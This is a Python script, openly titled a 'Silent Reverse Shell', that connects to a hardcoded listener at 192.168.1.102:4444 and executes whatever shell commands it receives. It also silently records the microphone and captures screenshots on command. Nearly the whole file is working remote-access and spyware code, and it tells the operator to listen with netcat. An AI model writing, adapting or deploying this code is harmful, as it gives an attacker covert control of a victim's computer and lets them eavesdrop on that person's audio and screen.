#!/usr/bin/env python3
"""
Silent Reverse Shell with Audio Recording
Auto-installs requirements: sounddevice, soundfile, numpy
"""

import subprocess
import sys
import os
import time

# ===== REQUIREMENTS AUTO-INSTALL (IMPROVED) =====
def install_requirements():
    """Automatically install required packages with better handling"""
    
    required_packages = {
        'sounddevice': 'sounddevice',
        'soundfile': 'soundfile', 
        'numpy': 'numpy'
    }
    
    print("[*] Checking and installing requirements...")
    print("[*] This may take a few moments...")
    
    missing_packages = []
    
    # Check which packages are missing
    for package in required_packages:
        try:
            __import__(package)
            print(f"[+] {package} already installed")
        except ImportError:
            missing_packages.append(required_packages[package])
            print(f"[-] {package} not found")
    
    # Install missing packages
    if missing_packages:
        print(f"\n[*] Installing {len(missing_packages)} package(s): {', '.join(missing_packages)}")
        
        for package in missing_packages:
            try:
                print(f"[*] Installing {package}...")
                # Try with --quiet flag to reduce output
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", "--quiet", package],
                    timeout=120  # 2 minutes timeout
                )
                print(f"[+] {package} installed successfully")
                time.sleep(0.5)  # Small delay between installs
            except subprocess.TimeoutExpired:
                print(f"[!] {package} installation timed out, retrying...")
                # Retry once
                try:
                    subprocess.check_call(
                        [sys.executable, "-m", "pip", "install", package],
                        timeout=120
                    )
                    print(f"[+] {package} installed successfully (retry)")
                except:
                    print(f"[!] Failed to install {package}, trying with --user flag...")
                    try:
                        subprocess.check_call(
                            [sys.executable, "-m", "pip", "install", "--user", package],
                            timeout=120
                        )
                        print(f"[+] {package} installed successfully (user mode)")
                    except Exception as e:
                        print(f"[ERROR] Could not install {package}: {e}")
                        print(f"[!] Please install manually: pip install {package}")
                        return False
            except Exception as e:
                print(f"[!] Failed to install {package}, retrying with --user flag...")
                try:
                    subprocess.check_call(
                        [sys.executable, "-m", "pip", "install", "--user", package],
                        timeout=120
                    )
                    print(f"[+] {package} installed successfully (user mode)")
                except Exception as e2:
                    print(f"[ERROR] Could not install {package}: {e2}")
                    print(f"[!] Please install manually: pip install {package}")
                    return False
        
        print("\n[+] All requirements installed successfully!")
    else:
        print("\n[+] All requirements already installed!")
    
    return True

# Install requirements before importing
print("\n" + "="*50)
print("🔌 SILENT REVERSE SHELL (sounddevice)")
print("="*50)

if not install_requirements():
    print("[!] Some requirements failed to install. Exiting...")
    sys.exit(1)

# ===== NOW IMPORT PACKAGES =====
try:
    import sounddevice as sd
    import soundfile as sf
    import numpy as np
    import socket
    import time
    print("[+] All packages imported successfully!\n")
except ImportError as e:
    print(f"[ERROR] Failed to import packages: {e}")
    print("[!] Please run: pip install sounddevice soundfile numpy")
    sys.exit(1)

def record_audio_silent(duration=10):
    """sounddevice se background recording - Downloads folder mein save"""
    try:
        fs = 44100  # Sample rate
        
        # ===== DOWNLOADS FOLDER MEIN SAVE =====
        downloads_dir = os.path.expanduser("~/Downloads/Recordings")
        os.makedirs(downloads_dir, exist_ok=True)
        
        audio_file = os.path.join(downloads_dir, f"mic_{int(time.time())}.wav")
        
        print(f"[*] Recording {duration} seconds...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        
        sf.write(audio_file, recording, fs)
        print(f"[+] Audio saved: {audio_file}")
        return audio_file
    except Exception as e:
        print(f"[-] Recording error: {e}")
        return None

def reverse_shell():
    KALI_IP = "192.168.1.102"  # CHANGE THIS TO YOUR KALI IP
    KALI_PORT = 4444
    
    try:
        print(f"[*] Connecting to {KALI_IP}:{KALI_PORT}...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((KALI_IP, KALI_PORT))
        
        print("[+] Connected to Kali!")
        
        s.send(b"[+] Silent Recording Active! (sounddevice)\n")
        s.send(b"[+] Files saved in: C:\\Users\\ASIF COMPUTERS\\Downloads\\Recordings\\\n")
        s.send(b"[+] Commands: record 10, screenshot, help, exit\n")
        
        while True:
            command = s.recv(1024).decode().strip()
            if not command:
                break
            
            print(f"[*] Command received: {command}")
            
            if command.lower() == 'exit':
                s.send(b"[-] Closing...\n")
                break
            
            if command.lower().startswith('record'):
                try:
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    
                    s.send(f"[*] Recording {duration} seconds (silent)...\n".encode())
                    
                    audio_file = record_audio_silent(duration)
                    
                    if audio_file and os.path.exists(audio_file):
                        size = os.path.getsize(audio_file)
                        s.send(f"[+] Audio saved: {audio_file}\n".encode())
                        s.send(f"[+] File size: {size} bytes\n".encode())
                    else:
                        s.send(b"[-] Recording failed\n")
                except Exception as e:
                    s.send(f"[-] Error: {e}\n".encode())
                continue
            
            if command.lower() == 'screenshot':
                try:
                    ps_script = '''
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
                    $path = "$env:USERPROFILE\\Downloads\\Recordings\\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
                    $bitmap.Save($path)
                    Write-Host "SAVED:$path"
                    '''
                    result = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True)
                    if 'SAVED:' in result.stdout:
                        s.send(f"[+] Screenshot: {result.stdout.split('SAVED:')[1].strip()}\n".encode())
                    else:
                        s.send(b"[-] Screenshot failed\n")
                except Exception as e:
                    s.send(f"[-] Error: {e}\n".encode())
                continue
            
            if command.lower() == 'help':
                help_msg = """
                ===== COMMANDS =====
                record 10    - Record audio (silent) 10 sec
                record 20    - Record audio (silent) 20 sec
                screenshot   - Take screenshot
                dir          - List files
                whoami       - Show user
                ipconfig     - Network info
                notepad      - Open Notepad
                exit         - Close connection
                ===================
                Save Location: C:\\Users\\ASIF COMPUTERS\\Downloads\\Recordings\\
                """
                s.send(help_msg.encode())
                continue
            
            try:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                if not result:
                    result = "[+] Command executed\n"
                s.send(result.encode())
            except Exception as e:
                s.send(f"[-] Error: {e}\n".encode())
        
        s.close()
        print("[+] Connection closed")
    except Exception as e:
        print(f"[-] Connection error: {e}")

if __name__ == "__main__":
    print("=" * 50)
    print("[*] Save Location: C:\\Users\\ASIF COMPUTERS\\Downloads\\Recordings\\")
    print("[*] Make sure Kali is listening: nc -lvnp 4444")
    print("=" * 50)
    
    try:
        reverse_shell()
    except KeyboardInterrupt:
        print("\n[!] Exited by user")
    except Exception as e:
        print(f"[-] Error: {e}")
